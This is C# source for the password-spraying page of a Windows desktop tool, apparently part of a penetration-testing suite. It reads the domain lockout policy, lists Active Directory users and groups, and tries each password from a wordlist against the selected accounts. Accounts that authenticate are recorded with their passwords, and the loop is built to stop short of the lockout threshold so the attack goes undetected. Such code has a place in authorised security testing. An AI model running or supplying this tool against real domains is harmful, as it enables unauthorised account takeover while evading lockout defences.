using System;
using System.Collections.Generic;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Forms;

namespace Crypt3x_defacto {
    /// <summary>
    /// Interaction logic for PasswordSpraying.xaml
    /// </summary>
    public partial class PasswordSpraying : Page {
        Policy PolicyObj;
        List<string> pass = new List<string>();
        List<User> ADusers = new List<User>();
        SortedSet<string> domain_groups = new SortedSet<string>();
        List<User> spray_users = new List<User>();
        List<UserCredentials> authenticated_users = new List<UserCredentials>();

        struct UserCredentials {
            public string Username { get; set; }
            public string Password { get; set; }
        };

        class User {
            public User(GetUserInfo.User u) {
                name = u.Full_Name;
                display_name = u.Display_Name;
                domain = u.Domain;
                domain_group = u.Group_Name;
                password_last_set = u.Password_Last_Set.ToString();
            }

            public string name;
            public string display_name;
            public string domain;
            public string domain_group;
            public string password_last_set;
        };

        struct Policy {
            public string logoff;

            // password
            public string min_age;
            public string max_age;
            public string length;
            public string history;

            // lockout
            public string threshold;
            public string duration;
            public string observation;

            // computer role
            public string role;
        };


        public PasswordSpraying() {
            InitializeComponent();
        }

        public void get_policy() {
            var policy = new List<string>();
            try {
                var lines = Helper.Functions.runCMD("net", "accounts");
                foreach (var s in lines) {
                    var start = s.IndexOf(':') + 1;
                    if (start != 0)
                        policy.Add(s.Substring(start, s.Length - start).Trim());
                }
                set_policy(policy);
            } catch {
                System.Windows.MessageBox.Show("Sorry, cannot access the domain policy rules");
            }
        }

        public void set_policy(List<string> policy) {
            PolicyObj.logoff = policy[0];
            PolicyObj.min_age = policy[1];
            PolicyObj.max_age = policy[2];
            PolicyObj.length = policy[3];
            PolicyObj.history = policy[4];
            PolicyObj.threshold = policy[5];
            PolicyObj.duration = policy[6];
            PolicyObj.observation = policy[7];
            PolicyObj.role = policy[8];
        }

        public async void GetADUsers() {
            var domain = new SortedSet<string>();
            var users = await GetUserInfo.get_users();

            foreach (var u in users) {
                domain.Add(u.Domain);
                ADusers.Add(new User(u));
            }

            listBox0.ItemsSource = domain;
        }

        private void button_Click(object sender, RoutedEventArgs e) {
            var dlg = new OpenFileDialog();
            if (dlg.ShowDialog() == DialogResult.OK) {
                var file = dlg.FileName;
                loadTxt.Text = file;
                try { pass = File.ReadAllLines(file).ToList(); }
                catch (IOException) {}
            }
        }

        async private void start_btn_Click(object sender, RoutedEventArgs e) {
            int account, password_length;
            Int32.TryParse(PolicyObj.length, out password_length);
            if (int.TryParse(PolicyObj.threshold, out account)) {
            } else account = 0;

            try {
                start_btn.IsEnabled = false;
                get_spray_users();
                foreach (var p in pass) {
                    if(p.Length>=password_length)
                    {
                        --account;
                        foreach (var u in spray_users)
                            await Task.Run(() => signIn(u.name, p));
                        if (account == 2)
                            break;
                    }
                }

                authenticated_grid.ItemsSource = authenticated_users;
                status.Text = "Spray Completed";
                start_btn.IsEnabled = true;
            } catch { }
        }

        private void get_spray_users() {
            var temp_spray_users = new HashSet<string>();
            foreach (ListBoxItem l in listBox2.Items)
                temp_spray_users.Add(l.Content.ToString());

            foreach (var u in ADusers) {
                if (u.display_name != null && temp_spray_users.Contains(u.display_name)) {
                    spray_users.Add(u);
                    temp_spray_users.Remove(u.display_name);
                } else if (u.name != null && temp_spray_users.Contains(u.name)) {
                    spray_users.Add(u);
                    temp_spray_users.Remove(u.name);
                }
            }
        }

        public void signIn(string u, string p) {
            Dispatcher.Invoke(() => {
                status.Text = "Trying password: " + p + " on username: " + u;
            });

            using (var pc = new PrincipalContext(ContextType.Domain, Environment.UserDomainName)) {
                if (pc.ValidateCredentials(u, p)) {
                    authenticated_users.Add(new UserCredentials {
                        Password = p,
                        Username = u
                    });
                    Dispatcher.Invoke(() => {
                        authenticated_grid.ItemsSource = authenticated_users;
                    });
                }
            }
        }

        private void listBox_Selected(object sender, RoutedEventArgs e) {
            listBox1.Items.Clear();
            listBox2.Items.Clear();
            listBox1.Items.Add("All Users");
            foreach (var u in ADusers)
                if (listBox0.SelectedItem.Equals(u.domain))
                    domain_groups.Add(u.domain_group);
            foreach (var s in domain_groups)
                listBox1.Items.Add(s);
            domain_groups.Clear();
        }

        private void listBox1_MouseUp(object sender, System.Windows.Input.MouseButtonEventArgs e) {
            var domain_users = new SortedSet<string>();
            spray_users.Clear();

            foreach (var u in ADusers) {
                if (u.domain != null && listBox0.SelectedItem.Equals(u.domain)) {
                    if (listBox1.SelectedIndex == 0) {
                        if (u.display_name != null && u.display_name != "")
                            domain_users.Add(u.display_name);
                        else
                            domain_users.Add(u.name);
                    } else {
                        foreach (string s in listBox1.SelectedItems) {
                            if (u.domain_group != null && u.domain_group.Equals(s)) {
                                if (u.display_name != null && u.display_name != "")
                                    domain_users.Add(u.display_name);
                                else
                                    domain_users.Add(u.name);
                                break;
                            }
                        }
                    }
                }
            }

            listBox2.Items.Clear();
            foreach (var s in domain_users) {
                listBox2.Items.Add(new ListBoxItem {
                    Content = s,
                    IsSelected = true
                });
            }
        }
    }
}
